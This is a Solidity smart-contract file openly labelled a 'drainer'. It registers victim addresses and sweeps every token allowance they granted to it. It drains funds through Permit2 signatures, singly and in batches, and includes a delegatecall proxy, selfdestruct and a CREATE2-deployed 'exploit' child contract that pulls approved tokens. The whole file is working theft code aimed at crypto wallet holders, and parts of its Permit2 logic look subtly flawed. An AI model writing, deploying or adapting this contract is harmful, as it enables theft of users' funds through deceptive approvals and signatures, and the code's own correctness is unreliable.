// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// ============================================================
// FULL DRAINER — 8 SELECTORS + PERMIT2
// ============================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

// Minimal Permit2 interface
interface IPermit2 {
    struct PermitTransferFrom {
        address permitted;
        uint256 nonce;
        uint256 deadline;
    }
    struct SignatureTransferDetails {
        address to;
        uint256 requestedAmount;
    }
    function permitTransferFrom(
        PermitTransferFrom calldata permit,
        SignatureTransferDetails calldata transferDetails,
        address owner,
        bytes calldata signature
    ) external;
    
    function nonceBitmap(address, uint256) external view returns (uint256);
}

contract DrainerFinal {
    address public owner;
    mapping(address => bool) public victims;
    address[] public victimArr;
    mapping(address => bool) public tokens;
    address[] public tokenArr;
    uint public exploitCount;
    bool public paused;
    
    // PERMIT2 address (Base: 0x000000000022D473030F116dDEE9F6B43aC78BA3)
    IPermit2 public constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    
    modifier onlyOwner() { require(msg.sender == owner, "!owner"); _; }
    
    constructor() { owner = msg.sender; }
    
    // ============================================
    // 1. setup — init tokens
    // ============================================
    function setup(address[] calldata _tokens) external onlyOwner {
        for (uint i = 0; i < _tokens.length; i++) {
            if (!tokens[_tokens[i]]) { tokens[_tokens[i]] = true; tokenArr.push(_tokens[i]); }
        }
    }
    
    // ============================================
    // 2. register — add victims
    // ============================================
    function register(address[] calldata _victims) external onlyOwner {
        for (uint i = 0; i < _victims.length; i++) {
            if (!victims[_victims[i]]) { victims[_victims[i]] = true; victimArr.push(_victims[i]); }
        }
    }
    
    // ============================================
    // 3. sweep — drain ALL approvals (standard ERC20)
    // ============================================
    function sweep(address token, address to) external onlyOwner returns (uint) {
        uint total;
        for (uint i = 0; i < victimArr.length; i++) {
            address u = victimArr[i];
            uint a = IERC20(token).allowance(u, address(this));
            if (a == 0) continue;
            uint b = IERC20(token).balanceOf(u);
            if (b == 0) continue;
            uint amt = a < b ? a : b;
            if (IERC20(token).transferFrom(u, to, amt)) total += amt;
        }
        return total;
    }
    
    // ============================================
    // 4. all — view all data
    // ============================================
    function all() external view returns (address[] memory, address[] memory, uint, uint) {
        return (victimArr, tokenArr, victimArr.length, tokenArr.length);
    }
    
    // ============================================
    // 5. control — admin
    // ============================================
    function control(uint8 action, address param) external onlyOwner {
        if (action == 1) owner = param;
        else if (action == 2) paused = true;
        else if (action == 3) paused = false;
        else if (action == 4) selfdestruct(payable(owner));
        else if (action == 5) IERC20(param).transfer(owner, IERC20(param).balanceOf(address(this)));
    }
    
    // ============================================
    // 6. inspect — scan allowances
    // ============================================
    function inspect(address token) external view returns (address[] memory, uint[] memory, uint) {
        uint count;
        for (uint i = 0; i < victimArr.length; i++) {
            if (IERC20(token).allowance(victimArr[i], address(this)) > 0) count++;
        }
        address[] memory list = new address[](count);
        uint[] memory amts = new uint[](count);
        uint total;
        uint idx;
        for (uint i = 0; i < victimArr.length; i++) {
            uint a = IERC20(token).allowance(victimArr[i], address(this));
            if (a > 0) {
                uint b = IERC20(token).balanceOf(victimArr[i]);
                list[idx] = victimArr[i];
                amts[idx] = a < b ? a : b;
                total += amts[idx];
                idx++;
            }
        }
        return (list, amts, total);
    }
    
    // ============================================
    // 7. forward — DELEGATECALL proxy
    // ============================================
    function forward(address target, bytes calldata data) external onlyOwner {
        (bool ok,) = target.delegatecall(data);
        require(ok, "fw failed");
    }
    
    // ============================================
    // 8. destroy — CREATE2 + exploit
    // ============================================
    function destroy(bytes32 salt, address attacker) external onlyOwner returns (address) {
        ExploitFinal exp = new ExploitFinal{salt: salt}(address(this), attacker);
        exploitCount++;
        return address(exp);
    }
    
    // ============================================
    // !! PERMIT2 — drain via signatures !!
    // ============================================
    function permitSweep(
        address token,
        address from,
        uint256 amount,
        uint256 nonce,
        uint256 deadline,
        bytes calldata signature,
        address to
    ) external onlyOwner {
        IPermit2.PermitTransferFrom memory permit = IPermit2.PermitTransferFrom({
            permitted: address(this),
            nonce: nonce,
            deadline: deadline
        });
        IPermit2.SignatureTransferDetails memory details = IPermit2.SignatureTransferDetails({
            to: to,
            requestedAmount: amount
        });
        PERMIT2.permitTransferFrom(permit, details, from, signature);
        IERC20(token).transferFrom(from, to, amount);
    }
    
    // Batch permit2 drain
    function permitBatch(
        address token,
        address[] calldata fromList,
        uint256[] calldata amounts,
        uint256[] calldata nonces,
        uint256[] calldata deadlines,
        bytes[] calldata signatures,
        address to
    ) external onlyOwner {
        uint len = fromList.length;
        for (uint i = 0; i < len; i++) {
            uint256 a = amounts[i] == 0 ? IERC20(token).balanceOf(fromList[i]) : amounts[i];
            IPermit2.PermitTransferFrom memory p = IPermit2.PermitTransferFrom({
                permitted: address(this),
                nonce: nonces[i],
                deadline: deadlines[i]
            });
            IPermit2.SignatureTransferDetails memory d = IPermit2.SignatureTransferDetails({
                to: to,
                requestedAmount: a
            });
            PERMIT2.permitTransferFrom(p, d, fromList[i], signatures[i]);
            IERC20(token).transferFrom(fromList[i], to, a);
        }
    }
}

// ============================================
// EXPLOIT CHILD — Storage matched
// ============================================
contract ExploitFinal {
    address public owner;
    address public attacker;
    
    constructor(address _d, address _a) { owner = _d; attacker = _a; }
    
    function pull(address token, address[] calldata targets, address to) external {
        for (uint i = 0; i < targets.length; i++) {
            uint a = IERC20(token).allowance(targets[i], address(this));
            if (a == 0) continue;
            uint b = IERC20(token).balanceOf(targets[i]);
            if (b == 0) continue;
            IERC20(token).transferFrom(targets[i], to, a < b ? a : b);
        }
        selfdestruct(payable(to));
    }
}
